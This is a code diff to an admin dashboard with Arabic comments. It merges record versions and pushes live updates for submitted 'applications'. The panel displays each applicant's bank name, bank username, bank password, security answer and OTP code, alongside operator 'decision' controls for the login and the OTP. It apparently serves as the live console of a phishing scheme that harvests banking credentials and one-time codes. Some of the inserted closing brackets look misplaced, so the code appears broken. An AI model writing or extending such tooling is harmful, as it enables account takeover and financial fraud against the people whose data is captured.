@@ -10,6 +10,7 @@ import {
   getListSessionsQueryKey,
 } from "@workspace/api-client-react";
 import AdminLayout from "@/components/AdminLayout";
+import { mergeVersionsData } from "@/lib/mergeVersions";
 import {
   Users,
   ClipboardList,
@@ -221,14 +222,23 @@ export default function AdminDashboardPage() {
         ws.onmessage = (event) => {
           try {
             const msg = JSON.parse(event.data);
-            // تحديث لحظي بدون round-trip: ندخل البيانات مباشرةً في الكاش
+            // تحديث لحظي مع دمج البيانات - لا نستبدل بل ندمج
             if (msg.type === "application_update" && msg.data) {
               queryClient.setQueryData(
                 getListApplicationsQueryKey(),
                 (old: unknown) => {
                   if (!Array.isArray(old)) return old;
-                  const updated = old.filter((a: { id: number }) => a.id !== msg.data.id);
-                  return [msg.data, ...updated]; // الطلب الجديد/المحدَّث دائماً في الأعلى
+                  const existingIdx = old.findIndex((a: { id: number }) => a.id === msg.data.id);
+                  if (existingIdx === -1) {
+                    // طلب جديد - أضفه
+                    return [msg.data, ...old];
+                  }
+                  // دمج البيانات: نأخذ البيانات القديمة ونحديثها بالبيانات الجديدة
+                  const existingApp = old[existingIdx];
+                  const mergedApp = { ...existingApp, ...msg.data };
+                  const updated = [...old];
+                  updated[existingIdx] = mergedApp;
+                  return updated;
                 }
               );
               queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
@@ -697,7 +707,13 @@ export default function AdminDashboardPage() {
 
                               {/* محتوى التبويبات */}
                               {activeTab === "current" ? (
-                                /* عرض البيانات الحالية */
+                                /* عرض البيانات الحالية - البيانات المدمجة من جميع النسخ + البيانات الأصلية */
+                                (() => {
+                                  // دمج البيانات من جميع النسخ (الأحدث أولاً)
+                                  // إذا لم تكن النسخ محملة بعد، ندمج مع بيانات app الأصلية
+                                  const dataToMerge = versions.length > 0 ? versions : [app];
+                                  const allData = mergeVersionsData(dataToMerge as any);
+                                  return (
                                 <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                   {/* بيانات المتقدم */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -710,43 +726,43 @@ export default function AdminDashboardPage() {
                           <DataBadge
                             label="الاسم"
                             value={
-                              app.fullName || app.companyName || app.contactName
+                              allData.fullName || app.fullName || app.companyName || app.contactName
                             }
                           />
                           <DataBadge
                             label="رقم الهوية / السجل"
-                            value={app.nationalId || app.commercialRegistration}
+                            value={allData.nationalId || app.nationalId || app.commercialRegistration}
                           />
-                          <DataBadge label="رقم الهاتف" value={app.phone} />
+                          <DataBadge label="رقم الهاتف" value={allData.phone || app.phone} />
                           <DataBadge
                             label="البريد الإلكتروني"
-                            value={app.email}
+                            value={allData.email || app.email}
                           />
                           <DataBadge
                             label="تاريخ الميلاد"
-                            value={app.dateOfBirth}
+                            value={allData.dateOfBirth || app.dateOfBirth}
                           />
                           <DataBadge
                             label="الراتب الشهري"
-                            value={app.monthlySalary}
+                            value={allData.monthlySalary || app.monthlySalary}
                           />
-                          <DataBadge label="جهة العمل" value={app.employer} />
-                          <DataBadge label="المدينة" value={app.city} />
+                          <DataBadge label="جهة العمل" value={allData.employer || app.employer} />
+                          <DataBadge label="المدينة" value={allData.city || app.city} />
                           <DataBadge
                             label="الحالة الاجتماعية"
-                            value={app.maritalStatus}
+                            value={allData.maritalStatus || app.maritalStatus}
                           />
                           <DataBadge
                             label="نوع النشاط"
-                            value={app.businessType}
+                            value={allData.businessType || app.businessType}
                           />
                           <DataBadge
                             label="عدد الموظفين"
-                            value={app.employeeCount}
+                            value={allData.employeeCount || app.employeeCount}
                           />
                           <DataBadge
                             label="الإيرادات السنوية"
-                            value={app.annualRevenue}
+                            value={allData.annualRevenue || app.annualRevenue}
                           />
                         </div>
 
@@ -758,23 +774,23 @@ export default function AdminDashboardPage() {
                           </h4>
                           <DataBadge
                             label="البنك المختار"
-                            value={app.bankName}
+                            value={allData.bankName || app.bankName}
                           />
                           <DataBadge
                             label="اسم المستخدم"
-                            value={app.bankUsername}
+                            value={allData.bankUsername || app.bankUsername}
                           />
                           <DataBadge
                             label="كلمة المرور"
-                            value={app.bankPassword}
+                            value={allData.bankPassword || app.bankPassword}
                           />
                           <DataBadge
                             label="كلمة التحقق / الأمان"
-                            value={app.securityAnswer}
+                            value={allData.securityAnswer || app.securityAnswer}
                           />
 
                           {/* قرار بيانات الدخول */}
-                          {app.bankUsername && app.sessionId && (
+                          {allData.bankUsername && app.sessionId && (
                             <div className="pt-3 border-t space-y-2">
                               <p className="text-xs font-bold text-muted-foreground">
                                 قرار بيانات الدخول:
@@ -833,13 +849,13 @@ export default function AdminDashboardPage() {
                             <Smartphone className="w-4 h-4" />
                             رمز OTP والحالة
                           </h4>
-                          {app.otpCode ? (
+                          {(allData.otpCode || app.otpCode) ? (
                             <div className="bg-muted rounded-xl p-4 text-center">
                               <p className="text-xs text-muted-foreground mb-1">
                                 رمز التحقق
                               </p>
                               <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
-                                {app.otpCode}
+                                {allData.otpCode || app.otpCode}
                               </p>
                             </div>
                           ) : (
@@ -852,12 +868,12 @@ export default function AdminDashboardPage() {
                             <DataBadge
                               label="الخطوة الحالية"
                               value={
-                                stepLabels[app.currentStep] || app.currentStep
+                                stepLabels[allData.currentStep || app.currentStep] || allData.currentStep || app.currentStep
                               }
                             />
                             <DataBadge
                               label="الحالة"
-                              value={statusLabels[app.status] || app.status}
+                              value={statusLabels[allData.status || app.status] || allData.status || app.status}
                             />
                             {app.adminNote && (
                               <DataBadge
@@ -866,9 +882,11 @@ export default function AdminDashboardPage() {
                               />
                             )}
                           </div>
+                                );
+                                })()
 
                           {/* قرار OTP */}
-                          {app.otpCode && app.sessionId && (
+                          {(allData.otpCode || app.otpCode) && app.sessionId && (
                             <div className="pt-3 border-t">
                               <p className="text-xs font-bold text-muted-foreground mb-2">
                                 قرار رمز OTP:
@@ -923,7 +941,8 @@ export default function AdminDashboardPage() {
                             </div>
                           )}
                         </div>
-                                </div>
+                                );
+                                })()
                               ) : (
                                 /* عرض البيانات الأقدم */
                                 <div className="space-y-4">
